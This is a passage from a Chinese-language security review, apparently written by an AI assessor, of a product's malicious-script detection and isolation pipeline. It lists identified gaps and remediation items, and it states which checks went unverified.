3. **检测/隔离"最后一里"是纸面的（§3.1）**：content 无 artifact 绑定（投毒面 R-3）、excerpt 明文窗口（R-7）、单条 high 即隔离且无负向护栏（R-8）、syntax error 静默放行（R-3b）、isolation 无运行时效应 + SoD 缺口（R-4）。每一条修复成本都很低（行级），但合起来决定了"恶意脚本检测"这个故事能否对产品承诺成立。

OpenShell 侧残留照旧：静态域 4/5 不可强制（B1，generation 路径 v0.0.104 未验证）、verify 只到 readback（§2.3）、rollback 无 expected-revision（R-2/B1 中期线）、CLI env 污染面（B4）。

第二轮评审曾说"三个安全 bug（越权 target / 静态错觉 / 空目录 PRUNE）+ 一个产品偏差"——当前后两者已 fail-closed 收口。下一轮的头号 ugliness 不再是"安全是否有洞"，而是 **"fresh install → 发现 → 风险 → 检测 → 管控"整条 ARMED 链路第一次真正端到端跑通**（L0-1 正例链就是那次验收）。把 L0+L1 落完，产品对外可讲：*"管控闭环已端到端可达（sandbox 网络域可强制，静态域待 OpenShell generation 解锁）；隔离为叠加记录+徽标联动，运行时冻结待双轨 Host Sensor 补齐。"*——只在这层诚实，才是一期上线叙事的地基。

**一句话行动表**：R-1(锚点下沉或补 instances 端点) + R-6(web 协议迁移+bindings UI) + R-3(digest 绑定) + R-7(excerpt 只留 sha) + R-8(critical-only 隔离+负向全量) + R-3b(12~15 保守规则+静默→medium finding) + R-4a(徽标联动+事件名收敛) + R-4b(release 权限+归属) + GOMAP(遍历排序) + L2 各 Budget 项；OpenShell 侧 B1/R-2/B3/B4 随 generation 解锁一并实弹验。

*主评估人：Claude（深度体检模式）；核验子代理：威胁检测与隔离闭环 ✅、Binding 部署链端到端 ✅（关键断言均已主评估人 spot-check 复核）；Edge claim·指纹·eval 线因 stage-2 分类器故障未核验（§5）*
